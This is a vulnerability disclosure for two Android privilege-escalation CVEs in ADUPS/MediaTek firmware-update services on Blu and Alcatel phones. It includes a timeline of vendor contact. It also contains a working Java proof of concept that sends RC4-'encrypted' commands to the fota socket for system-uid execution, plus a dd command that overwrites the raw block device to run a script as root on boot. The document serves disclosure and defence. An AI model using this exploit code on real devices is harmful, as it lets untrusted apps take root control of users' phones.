# CVEs
CVE-2015-2231
CVE-2015-2232

## Affected Devices (tested on)
- Blu Studio 5.0c (MT6582)
- Blu Vivo Air (MT6592)
- Alcatel OneTouch Evolve2 (MT6582)
- Likely other Blu devices
- Likely other Alcatel devices
- Likely other devices using MediaTek FOTA update services which is called [ADUPS](http://mg.adups.cn/adups/index.html)

I have been unable to establish a proper line of communication with any of the affected vendors. Multiple emails to MediaTek emails have resulted in radio silence, BLU claims they have no security department and cannot assist.

The Android Security team however has accepted the [CTS patch](https://android.googlesource.com/platform/cts/+/8a13023f463ecc0e266072863ecf23b0a559ec2f) to add an extra check for this system socket. This is very much like Jon Sawyer's checks previous which they purposefully evades, so let's see if they do it again.

## CVE-2015-2231 (user escalation to system)
Blu/Mediatek/ADUPS’s OTA system uses `/system/bin/fotabinder` service and socket at `/dev/socket/fota` which is initiated by `FWUpgradeInit.rc` as follows;

```
service fotabinder /system/bin/fotabinder
      class main
      socket fota stream 600 system system
```

This script is imported inside of `init.rc`;
```
import /FWUpgradeInit.rc
```
This socket and binary is used to allow FWUpdate (package name com.adups.fota) the ability to run system uid commands over the socket. This is similar to CVE-2014-1600, however the socket only allows system uid commands to be executed and the socket is “encrypted” used RC4 (with the key always being "system") opposed to cleartext. The socket has also been changed, likely in an attempt to evade the CTS tests which specifically check for CVE-2014-1600.

Using the attached POC any application which has the INTERNET permission can connect to the socket and execute a system uid command. This issue has been assigned CVE-2015-2231.

## CVE-2015-2232 (system escalation to root)
After gaining system uid access, we can then gain root privileges utilizing an a misconfiguration of mounted blocks;
```
root@BLU STUDIO 5.0 C:/dev/block # ls -l /dev/block/mmcblk0
brw-rw---- root system 179, 0 2015-03-09 13:41 mmcblk0 
```
`mmcblk0` is the entire mounted partition, which `system` has complete read and write access to. From here we can use CVE-2015-2231 to execute a shell script as `system` to write to `mmcblk0` and cause a script to be executed as `root` on boot. This can allow the system uid to grain root and has been assigned CVE-2015-2232.

## Timeline
- 2015-03-01 Discovery
- 2015-03-05 Request Security Contact (BLU/Mediatek) 
             CVEs Requested 
- 2015-03-06 CVEs Assigned
- 2015-03-06 BLU responded "no security department available"
- 2015-03-09 Contact ADUPS
- 2015-03-09 Contact security@android.com
- 2015-03-10 Reply from security@android.com, assigned ANDROID-19679287
- 2015-05-01 Discussed vulnerability semi-publically at Qualcomm Mobile Security Summit
- 2015-05-17 Test accepted by Android Security Team to CTS to look for bad socket
- 2015-05-20 One last attempt to reach out to ADUPS/Mediatek
- 2015-05-21 Public release of doc
- 2015-05-22 MediaTek finally responds saying they where told by Google and it "should be all set"

## CVE-2015-2231 example code;
```
package diff.strazzere.blukit;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import android.net.LocalSocket;
import android.net.LocalSocketAddress;

/**
 * Send commands to fota service and get system uid execution
 *
 * @author tim strazzere <diff@lookout.com>
 */
public class BluSocket {

    private byte[] buf;
    private int buflen;

    private LocalSocket mSocket;
    private InputStream mIn;
    private OutputStream mOut;

    public BluSocket() {
        buflen = 0;
        buf = new byte[0x400];
    }

    public boolean connect() {
        mSocket = new LocalSocket();

        try {
            mSocket.connect(new LocalSocketAddress("fota", LocalSocketAddress.Namespace.RESERVED));
            mIn = mSocket.getInputStream();
            mOut = mSocket.getOutputStream();
            return true;
        } catch (IOException e) {
            e.printStackTrace();
        }

        return false;
    }

    public void disconnect() {
        if (mSocket != null) {
            try {
                mSocket.close();
                mSocket = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        if (mIn != null) {
            try {
                mIn.close();
                mIn = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        if (mOut != null) {
            try {
                mOut.close();
                mOut = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public int execute(String ACTION_UPDATE_REPORT) {
        return transaction(ACTION_UPDATE_REPORT);
    }

    public int transaction(String ACTION_UPDATE_REPORT) {
        if (connect()) {
            if (writeCommand(ACTION_UPDATE_REPORT)) {
                if (readReply()) {
                    return (buf[0] & 0xFF) | ((buf[1] & 0xFF) << 8) | ((buf[2] & 0xFF) << 16) | ((buf[3] & 0xFF) << 24);
                }
            }
        }

        return -1;
    }

    public boolean writeCommand(String ACTION_UPDATE_REPORT) {
        byte[] data = cipher(ACTION_UPDATE_REPORT, "system").getBytes();

        if ((data.length > 0) && (data.length < 1024)) {
            buf[0] = (byte) (data.length & 0xFF);
            buf[1] = (byte) ((data.length >> 8) & 0xFF);

            try {
                mOut.write(buf, 0, 2);
                mOut.write(data, 0, data.length);
                return true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return false;
    }

    public boolean readReply() {
        buflen = 0;
        if (readBytes(buf, 2)) {
            int length = (buf[0] & 0xFF) | ((buf[1] & 0xFF) << 8);
            if ((length > 0) && (length <= 1024)) {
                buflen = length;
                return readBytes(buf, length);
            } else {
                disconnect();
            }
        }

        return false;
    }

    public boolean readBytes(byte[] ACTION_UPDATE_REPORT, int length) {
        try {
            if (length > 0) {
                int read = 0;
                int rest = length - read;
                int result = 0;
                while (read < length) {
                    result = mIn.read(buf, read, rest);
                    if (result < 0) {
                        break;
                    }
                    read += result;
                }

                if (read == length) {
                    return true;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    /*
     * "crypto" -> RC4 with the string "system"
     */
    public static String cipher(String ACTION_UPDATE_REPORT, String system) {
        String result = null;

        if ((ACTION_UPDATE_REPORT != null) && (system != null)) {
            byte[] command_bytes = ACTION_UPDATE_REPORT.getBytes();
            byte[] system_bytes = system.getBytes();
            byte[] array = new byte[0x100];

            for (int i = 0; i < array.length; i++) {
                array[i] = ((byte) i);
            }

            if ((system_bytes != null) && (system_bytes.length != 0)) {
                int index = 0;
                int system_index = 0;
                byte tmp_byte;
                for (int i = 0; i < 0x100; i++) {
                    index = (index + ((system_bytes[system_index] & 255) + (array[i] & 255))) & 255;
                    tmp_byte = array[i];
                    array[i] = array[index];
                    array[index] = tmp_byte;
                    system_index = (system_index + 1) % system_bytes.length;
                }

                system_bytes = array;
            }

            array = new byte[command_bytes.length];
            int index = 0;
            int system_index = 0;
            byte tmp_byte;
            for (int i = 0; i < command_bytes.length; i++) {
                system_index = (system_index + 1) & 255;
                index = (index + (system_bytes[system_index] & 255)) & 255;
                tmp_byte = system_bytes[system_index];
                system_bytes[system_index] = system_bytes[index];
                system_bytes[index] = tmp_byte;
                array[i] = ((byte) (system_bytes[((system_bytes[system_index] & 255) + (system_bytes[index] & 255)) & 255] ^ command_bytes[i]));
            }

            command_bytes = array;

            StringBuffer buffer = new StringBuffer(command_bytes.length);
            for (byte command_byte : command_bytes) {
                buffer.append(((char) command_byte));
            }

            result = stringToHexString(buffer.toString());
        }

        return result;
    }

    private static String stringToHexString(String ACTION_UPDATE_REPORT) {
        String result = "";
        for (int i = 0; i < ACTION_UPDATE_REPORT.length(); ++i) {
            String intermediate = Integer.toHexString(ACTION_UPDATE_REPORT.charAt(i) & 255);
            if (intermediate.length() == 1) {
                intermediate = String.valueOf('0') + intermediate;
            }

            result = String.valueOf(result) + intermediate;
        }

        return result;
    }
}

```

## CVE-2015-2232 example code;
Using CVE-2015-2231 execute a shell script like the following;

```
#!/bin/bash
dd if=/data/local/tmp/yay/inject of=/dev/block/mmcblk0 seek=252239890 bs=1 conv=notrunc
```

Which will inject “/data/local/tmp/shell.sh #” into the script `partition_permission.sh`, which is run by root on restart;

```
root@BLU STUDIO 5.0 C:/ # ls -l /system/etc/partition_permission.sh
-rwxr-x--- root root 676 2014-07-28 03:12 partition_permission.sh
```

Proof of Concept
================

The POC and actual code I used for achieving root can be found at the repo [adups-get-super-serial](https://github.com/rednaga/adups-get-super-serial) (publical as of Sept. 9th, 2015)
